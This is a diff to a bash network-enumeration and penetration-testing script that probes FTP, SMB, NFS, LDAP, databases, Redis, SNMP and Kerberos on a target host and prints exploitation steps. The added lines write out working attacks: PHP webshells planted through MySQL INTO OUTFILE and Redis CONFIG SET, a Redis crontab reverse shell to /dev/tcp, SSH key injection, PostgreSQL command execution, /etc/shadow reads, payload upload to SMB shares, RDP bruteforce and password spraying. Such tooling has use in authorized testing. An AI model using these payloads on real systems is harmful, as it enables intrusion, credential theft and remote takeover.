@@ -587,10 +587,16 @@ phase_services() {
     section "FTP (21)"
     info "Testing anonymous login..."
     _ftp_out=$(curl -s -m 10 "ftp://$TARGET/" --user "anonymous:anonymous" 2>&1) || true
-    if [ $? -eq 0 ] && [ -n "$_ftp_out" ]; then
+    if [ -n "$_ftp_out" ] && ! echo "$_ftp_out" | grep -qi "denied\|failed\|Login incorrect\|530"; then
       hi "FTP anonymous login SUCCESSFUL"
       emit "$_ftp_out"
-      _rec "[PRIVESC] FTP anonymous login works — check for writable dirs or sensitive files"
+      [ -n "$OUTDIR" ] && echo "$_ftp_out" > "$OUTDIR/ftp_listing.txt"
+      _rec "[PRIVESC] FTP anonymous login works — enumerate and download:"
+      _rec "  → ftp $TARGET  (user: anonymous, pass: anonymous)"
+      _rec "  → wget -m --no-passive ftp://anonymous:anonymous@$TARGET/"
+      if echo "$_ftp_out" | grep -qiE '\.txt|\.conf|\.bak|\.xml|\.cfg|\.ini|\.sh|\.py|\.key|\.pem|id_rsa'; then
+        _rec "  → Sensitive files detected in FTP listing — download immediately"
+      fi
     else
       info "Anonymous login failed"
     fi
@@ -617,7 +623,11 @@ phase_services() {
     _smtp=$(echo "VRFY root" | nc -w 3 "$TARGET" 25 2>/dev/null) || true
     if echo "$_smtp" | grep -q "252\|250"; then
       hi "SMTP VRFY enabled — user enumeration possible"
-      _rec "[ENUM] SMTP VRFY enabled on :25 → enumerate users: smtp-user-enum -M VRFY -U users.txt -t $TARGET"
+      [ -n "$OUTDIR" ] && echo "$_smtp" > "$OUTDIR/smtp_vrfy.txt"
+      _rec "[ENUM] SMTP VRFY enabled on :25 → enumerate users:"
+      _rec "  → smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $TARGET"
+      _rec "  → smtp-user-enum -M RCPT -U users.txt -t $TARGET"
+      _rec "  → nmap --script smtp-enum-users -p 25 $TARGET"
     fi
   fi
 
@@ -630,16 +640,22 @@ phase_services() {
       if echo "$_zt" | grep -q "XFR size"; then
         hi "Zone transfer SUCCESSFUL"
         emit "$_zt"
+        [ -n "$OUTDIR" ] && echo "$_zt" > "$OUTDIR/dns_zonetransfer.txt"
         _rec "[PRIVESC] DNS zone transfer allowed — full domain map obtained"
+        _rec "  → Review $OUTDIR/dns_zonetransfer.txt for internal hostnames"
+        _rec "  → dig @$TARGET axfr <domain>"
+        _rec "  → Add discovered hostnames to /etc/hosts for further enum"
       else
         info "Zone transfer denied"
       fi
     fi
     if _has dnsenum; then
       info "Running dnsenum..."
-      dnsenum --dnsserver "$TARGET" "$TARGET" --noreverse 2>/dev/null | head -50 | while IFS= read -r line; do
-        emit "$line"
-      done
+      _dnsenum_out=$(dnsenum --dnsserver "$TARGET" "$TARGET" --noreverse 2>/dev/null | head -50) || true
+      if [ -n "$_dnsenum_out" ]; then
+        echo "$_dnsenum_out" | while IFS= read -r line; do emit "$line"; done
+        [ -n "$OUTDIR" ] && echo "$_dnsenum_out" > "$OUTDIR/dnsenum.txt"
+      fi
     fi
   fi
 
@@ -651,16 +667,24 @@ phase_services() {
       _nfs=$(showmount -e "$TARGET" 2>/dev/null) || true
       if [ -n "$_nfs" ]; then
         emit "$_nfs"
-        if echo "$_nfs" | grep -qi '\*'; then
-          hi "NFS export available to everyone (*)"
-          _rec "[PRIVESC] NFS export open to * → mount -t nfs $TARGET:<path> /mnt — check for no_root_squash"
-        fi
         [ -n "$OUTDIR" ] && echo "$_nfs" > "$OUTDIR/nfs_exports.txt"
+        echo "$_nfs" | grep -v '^Export' | while IFS= read -r _export_line; do
+          _export_path=$(echo "$_export_line" | awk '{print $1}')
+          _export_who=$(echo "$_export_line" | awk '{print $2}')
+          [ -z "$_export_path" ] && continue
+          _rec "[PRIVESC] NFS export: $_export_path ($_export_who) — mount and inspect:"
+          _rec "  → mkdir -p /mnt/nfs_${TARGET}"
+          _rec "  → mount -t nfs $TARGET:$_export_path /mnt/nfs_${TARGET}"
+          _rec "  → ls -la /mnt/nfs_${TARGET}"
+          if echo "$_export_who" | grep -q '\*'; then
+            _rec "  → Export open to * — check no_root_squash: create SUID binary if writable"
+          fi
+        done
       else
         info "No NFS exports or showmount failed"
       fi
     else
-      warn "showmount not available"
+      warn "showmount not available — try: showmount -e $TARGET"
     fi
   fi
 
@@ -681,19 +705,42 @@ phase_services() {
 
     if _has smbmap; then
       info "smbmap null session..."
-      smbmap -H "$TARGET" -u '' -p '' 2>/dev/null | while IFS= read -r line; do
-        emit "$line"
-        if echo "$line" | grep -qi 'READ\|WRITE'; then
-          _rec "[ENUM] SMB share accessible: $line"
-        fi
-      done
+      _smbmap_out=$(smbmap -H "$TARGET" -u '' -p '' 2>/dev/null) || true
+      if [ -n "$_smbmap_out" ]; then
+        echo "$_smbmap_out" | while IFS= read -r line; do
+          emit "$line"
+        done
+        [ -n "$OUTDIR" ] && echo "$_smbmap_out" > "$OUTDIR/smbmap.txt"
+        echo "$_smbmap_out" | grep -iE 'READ|WRITE' | while IFS= read -r line; do
+          _share_name=$(echo "$line" | awk '{print $1}')
+          _share_perm=$(echo "$line" | grep -oiE 'READ|WRITE' | tr '\n' '+' | sed 's/+$//')
+          [ -z "$_share_name" ] && continue
+          _rec "[ENUM] SMB share \\\"$_share_name\\\" — $_share_perm access:"
+          _rec "  → smbclient //$TARGET/$_share_name -N"
+          _rec "  → smbmap -H $TARGET -u '' -p '' -r $_share_name"
+          if echo "$_share_perm" | grep -qi 'WRITE'; then
+            _rec "  → WRITABLE! Upload payload: smbclient //$TARGET/$_share_name -N -c 'put payload.exe'"
+          fi
+          _rec "  → Download all: smbget -R smb://$TARGET/$_share_name/ -U ''"
+        done
+      fi
     fi
 
     if _has smbclient; then
       info "smbclient share listing..."
-      smbclient -L "//$TARGET" -N 2>/dev/null | while IFS= read -r line; do
-        emit "$line"
-      done
+      _smb_list=$(smbclient -L "//$TARGET" -N 2>/dev/null) || true
+      if [ -n "$_smb_list" ]; then
+        echo "$_smb_list" | while IFS= read -r line; do
+          emit "$line"
+        done
+        [ -n "$OUTDIR" ] && echo "$_smb_list" > "$OUTDIR/smbclient_shares.txt"
+        echo "$_smb_list" | grep -i 'Disk' | while IFS= read -r line; do
+          _share_name=$(echo "$line" | sed 's/^[[:space:]]*//' | awk '{print $1}')
+          [ -z "$_share_name" ] && continue
+          [ "$_share_name" = "IPC\$" ] && continue
+          _rec "[ENUM] SMB share found: $_share_name → smbclient //$TARGET/$_share_name -N"
+        done
+      fi
     fi
   fi
 
@@ -705,7 +752,16 @@ phase_services() {
       _ldap=$(ldapsearch -x -H "ldap://$TARGET" -b "" -s base "(objectclass=*)" 2>/dev/null) || true
       if [ -n "$_ldap" ]; then
         emit "$_ldap"
-        _rec "[ENUM] LDAP anonymous bind works → enumerate: ldapsearch -x -H ldap://$TARGET -b 'DC=...' '(objectclass=*)'"
+        [ -n "$OUTDIR" ] && echo "$_ldap" > "$OUTDIR/ldap_base.txt"
+        _ldap_base=$(echo "$_ldap" | grep -i 'namingContexts' | head -1 | awk '{print $2}')
+        _rec "[ENUM] LDAP anonymous bind works — enumerate:"
+        if [ -n "$_ldap_base" ]; then
+          _rec "  → ldapsearch -x -H ldap://$TARGET -b '$_ldap_base' '(objectclass=person)'"
+          _rec "  → ldapsearch -x -H ldap://$TARGET -b '$_ldap_base' '(objectclass=*)' | grep -i pass"
+        else
+          _rec "  → ldapsearch -x -H ldap://$TARGET -b 'DC=domain,DC=local' '(objectclass=*)'"
+        fi
+        _rec "  → ldapdomaindump -u '' -p '' ldap://$TARGET -o $OUTDIR/ldap/"
       fi
     fi
   fi
@@ -715,14 +771,20 @@ phase_services() {
     section "RDP (3389)"
     if _has rdp-sec-check; then
       info "Running rdp-sec-check..."
-      rdp-sec-check "$TARGET" 2>/dev/null | while IFS= read -r line; do
-        emit "$line"
-      done
+      _rdp_sec=$(rdp-sec-check "$TARGET" 2>/dev/null) || true
+      if [ -n "$_rdp_sec" ]; then
+        echo "$_rdp_sec" | while IFS= read -r line; do emit "$line"; done
+        [ -n "$OUTDIR" ] && echo "$_rdp_sec" > "$OUTDIR/rdp_sec_check.txt"
+      fi
     fi
     _rdp_nla=$(nmap $NMAP_BASE --script rdp-ntlm-info -p 3389 "$TARGET" 2>/dev/null | grep -i 'Target_Name\|Product_Version\|DNS_Domain') || true
     if [ -n "$_rdp_nla" ]; then
       info "RDP NTL info:"
       emit "$_rdp_nla"
+      [ -n "$OUTDIR" ] && echo "$_rdp_nla" > "$OUTDIR/rdp_ntlm.txt"
+      _rec "[ENUM] RDP NTLM info leaked — domain/version info obtained:"
+      _rec "  → xfreerdp /v:$TARGET /u:'' /p:''  (test null session)"
+      _rec "  → crowbar -b rdp -s $TARGET/32 -U users.txt -C passwords.txt  (bruteforce)"
     fi
   fi
 
@@ -737,7 +799,15 @@ phase_services() {
           if [ -n "$_mres" ]; then
             hi "MySQL login SUCCESS: $_mu / $_mp"
             emit "$_mres"
-            _rec "[PRIVESC] MySQL accessible with $_mu:$_mp → try: SELECT load_file('/etc/shadow'); or UDF exploit"
+            _mysql_dbs=$(mysql -h "$TARGET" -u "$_mu" -p"$_mp" -e "SHOW DATABASES;" 2>/dev/null) || true
+            [ -n "$_mysql_dbs" ] && emit "$_mysql_dbs"
+            [ -n "$OUTDIR" ] && { echo "Credentials: $_mu:$_mp"; echo "$_mres"; echo "$_mysql_dbs"; } > "$OUTDIR/mysql.txt"
+            _rec "[PRIVESC] MySQL accessible with $_mu:$_mp — next steps:"
+            _rec "  → mysql -h $TARGET -u $_mu -p'$_mp'"
+            _rec "  → SHOW DATABASES; USE <db>; SHOW TABLES; SELECT * FROM users;"
+            _rec "  → SELECT load_file('/etc/shadow');"
+            _rec "  → SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';"
+            _rec "  → UDF exploit: searchsploit mysql udf"
             break 2
           fi
         done
@@ -758,7 +828,14 @@ phase_services() {
           if [ -n "$_pres" ]; then
             hi "PostgreSQL login SUCCESS: $_pu / $_pp"
             emit "$_pres"
-            _rec "[PRIVESC] PostgreSQL accessible with $_pu:$_pp → try: COPY cmd_exec FROM PROGRAM 'id';"
+            _pg_dbs=$(PGPASSWORD="$_pp" psql -h "$TARGET" -U "$_pu" -c "\\l" 2>/dev/null) || true
+            [ -n "$_pg_dbs" ] && emit "$_pg_dbs"
+            [ -n "$OUTDIR" ] && { echo "Credentials: $_pu:$_pp"; echo "$_pres"; echo "$_pg_dbs"; } > "$OUTDIR/postgresql.txt"
+            _rec "[PRIVESC] PostgreSQL accessible with $_pu:$_pp — next steps:"
+            _rec "  → PGPASSWORD='$_pp' psql -h $TARGET -U $_pu"
+            _rec "  → \\l (list databases), \\dt (list tables), SELECT * FROM users;"
+            _rec "  → COPY (SELECT '') TO PROGRAM 'id';  (RCE as postgres user)"
+            _rec "  → SELECT pg_read_file('/etc/passwd');"
             break 2
           fi
         done
@@ -776,7 +853,18 @@ phase_services() {
       hi "Redis NO AUTH — accessible without password"
       _redis_ver=$(echo "$_redis" | grep "redis_version:" | cut -d: -f2 | tr -d '\r')
       info "Redis version: $_redis_ver"
-      _rec "[PRIVESC] Redis no-auth on :6379 (v$_redis_ver) → try: redis-cli -h $TARGET CONFIG SET dir /var/spool/cron/ + write crontab"
+      [ -n "$OUTDIR" ] && echo "$_redis" > "$OUTDIR/redis_info.txt"
+      _redis_keys=$(echo "KEYS *" | nc -w 3 "$TARGET" 6379 2>/dev/null) || true
+      if [ -n "$_redis_keys" ]; then
+        emit "$_redis_keys"
+        [ -n "$OUTDIR" ] && echo "$_redis_keys" >> "$OUTDIR/redis_info.txt"
+      fi
+      _rec "[PRIVESC] Redis no-auth on :6379 (v$_redis_ver) — exploitation paths:"
+      _rec "  → redis-cli -h $TARGET"
+      _rec "  → KEYS *  →  GET <key>  (dump all data)"
+      _rec "  → Webshell: CONFIG SET dir /var/www/html/; CONFIG SET dbfilename shell.php; SET x '<?php system(\$_GET[c]); ?>'; SAVE"
+      _rec "  → SSH key: CONFIG SET dir /root/.ssh/; CONFIG SET dbfilename authorized_keys; SET x '<your_pubkey>'; SAVE"
+      _rec "  → Crontab: CONFIG SET dir /var/spool/cron/crontabs/; CONFIG SET dbfilename root; SET x '\\n* * * * * bash -i >& /dev/tcp/LHOST/PORT 0>&1\\n'; SAVE"
     fi
   fi
 
@@ -788,7 +876,11 @@ phase_services() {
       if [ -n "$_mongo" ]; then
         hi "MongoDB NO AUTH — listing databases"
         emit "$_mongo"
-        _rec "[PRIVESC] MongoDB no-auth on :27017 → enumerate databases for credentials"
+        [ -n "$OUTDIR" ] && echo "$_mongo" > "$OUTDIR/mongodb.txt"
+        _rec "[PRIVESC] MongoDB no-auth on :27017 — next steps:"
+        _rec "  → mongosh --host $TARGET"
+        _rec "  → show dbs; use <db>; show collections; db.<collection>.find()"
+        _rec "  → Search for creds: db.<collection>.find({}, {password:1, passwd:1, secret:1})"
       fi
     fi
   fi
@@ -804,7 +896,14 @@ phase_services() {
     if [ -n "$_snmp_out" ] && ! echo "$_snmp_out" | grep -qi "timed out"; then
       hi "SNMP community string found"
       emit "$_snmp_out"
-      _rec "[ENUM] SNMP accessible → snmpwalk -v2c -c <community> $TARGET for full enum"
+      [ -n "$OUTDIR" ] && echo "$_snmp_out" > "$OUTDIR/snmp.txt"
+      _snmp_community=$(echo "$_snmp_out" | head -1 | grep -oE '\[.*\]' | tr -d '[]')
+      [ -z "$_snmp_community" ] && _snmp_community="public"
+      _rec "[ENUM] SNMP accessible (community: $_snmp_community) — enumerate:"
+      _rec "  → snmpwalk -v2c -c $_snmp_community $TARGET"
+      _rec "  → snmpwalk -v2c -c $_snmp_community $TARGET 1.3.6.1.2.1.25.4.2.1.2  (running processes)"
+      _rec "  → snmpwalk -v2c -c $_snmp_community $TARGET 1.3.6.1.2.1.25.6.3.1.2  (installed software)"
+      _rec "  → snmpwalk -v2c -c $_snmp_community $TARGET 1.3.6.1.4.1.77.1.2.25    (users)"
     fi
   fi
 
@@ -819,10 +918,18 @@ phase_services() {
         [ -f "$_kwl" ] && _krb_wl="$_kwl" && break
       done
       if [ -n "$_krb_wl" ]; then
-        kerbrute userenum -d "$TARGET" --dc "$TARGET" "$_krb_wl" 2>/dev/null | grep "VALID" | while IFS= read -r line; do
-          hi "$line"
-          _rec "[ENUM] Valid Kerberos user: $line"
-        done
+        _krb_out=$(kerbrute userenum -d "$TARGET" --dc "$TARGET" "$_krb_wl" 2>/dev/null) || true
+        if [ -n "$_krb_out" ]; then
+          echo "$_krb_out" | grep "VALID" | while IFS= read -r line; do
+            hi "$line"
+          done
+          [ -n "$OUTDIR" ] && echo "$_krb_out" | grep "VALID" > "$OUTDIR/kerberos_users.txt"
+          _rec "[ENUM] Valid Kerberos users found — next steps:"
+          _rec "  → See $OUTDIR/kerberos_users.txt"
+          _rec "  → AS-REP roast: GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip $TARGET -format hashcat"
+          _rec "  → Kerberoast: GetUserSPNs.py <domain>/<user>:<pass> -dc-ip $TARGET -request"
+          _rec "  → Password spray: kerbrute passwordspray -d <domain> --dc $TARGET users.txt 'Password1'"
+        fi
       fi
     fi
   fi
